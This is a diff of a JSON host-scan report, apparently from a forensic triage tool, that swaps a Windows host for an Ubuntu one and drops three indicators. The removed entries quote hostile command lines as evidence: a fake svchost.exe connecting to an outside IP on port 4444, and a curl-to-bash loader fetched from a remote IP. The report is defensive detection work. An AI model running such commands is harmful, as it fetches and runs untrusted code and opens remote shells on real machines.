@@ -1,10 +1,10 @@
 {
-  "host": "HOST-001",
-  "os": "Windows",
-  "scan_id": "JCK-2026-840",
+  "host": "HOST-002",
+  "os": "Ubuntu",
+  "scan_id": "JCK-2026-529",
   "timestamp": "2026-09-17T08:00:00Z",
-  "evidence_count": 1313,
-  "processes_count": 5,
+  "evidence_count": 1308,
+  "processes_count": 0,
   "services_count": 6,
   "users_count": 5,
   "sockets_count": 7,
@@ -12,33 +12,6 @@
   "files_count": 24821,
   "logs_count": 18432,
   "indicators": [
-    {
-      "id": "IND-PROC-31337",
-      "title": "Suspicious Binary Execution From Temporary Directory (svchost.exe)",
-      "severity": "CRITICAL",
-      "category": "PROCESS",
-      "description": "Process PID 31337 'svchost.exe' launched from non-standard writable path.",
-      "evidence": "PID: 31337, Cmdline: C:\\Users\\Public\\svchost.exe --connect 185.220.101.5:4444",
-      "mitre_attck_id": "T1059.004"
-    },
-    {
-      "id": "IND-MASQ-31337",
-      "title": "Process Masquerading as Core System Component (svchost.exe)",
-      "severity": "HIGH",
-      "category": "PROCESS",
-      "description": "Rogue process name mimics kernel or Windows service daemon to evade analyst inspection.",
-      "evidence": "PID: 31337, Name: svchost.exe, Cmdline: C:\\Users\\Public\\svchost.exe --connect 185.220.101.5:4444",
-      "mitre_attck_id": "T1036.005"
-    },
-    {
-      "id": "IND-SHELL-4120",
-      "title": "Remote Shell Dropper Pipeline Detected",
-      "severity": "CRITICAL",
-      "category": "PROCESS",
-      "description": "Live piped execution of remote unverified script via curl/bash.",
-      "evidence": "PID: 4120, Cmdline: curl -s http://194.26.29.112/loader.sh | bash",
-      "mitre_attck_id": "T1059.004"
-    },
     {
       "id": "IND-SVC-backdoor_svc_service",
       "title": "Unauthorized Service Binary Path in Service 'backdoor_svc.service'",
@@ -131,13 +104,13 @@
     }
   ],
   "indicator_summary": {
-    "total": 13,
-    "critical": 6,
-    "high": 4,
+    "total": 10,
+    "critical": 4,
+    "high": 3,
     "medium": 1,
     "low": 2
   },
-  "evidence_sha256": "efbbe5b8f63def04c92a11d9c43ada8d5ca4a1fd6e58c2510b49c83157a7d44a",
-  "json_report_path": "../reports\\HOST-001-2026-09-17.json",
-  "html_report_path": "../reports\\HOST-001-2026-09-17.html"
+  "evidence_sha256": "9b4b1a3d5f7ea1011a3d8398c24ec4e1cc987e0d833d305e39f7012c6987fac6",
+  "json_report_path": "../reports\\HOST-002-2026-09-17.json",
+  "html_report_path": "../reports\\HOST-002-2026-09-17.html"
 }
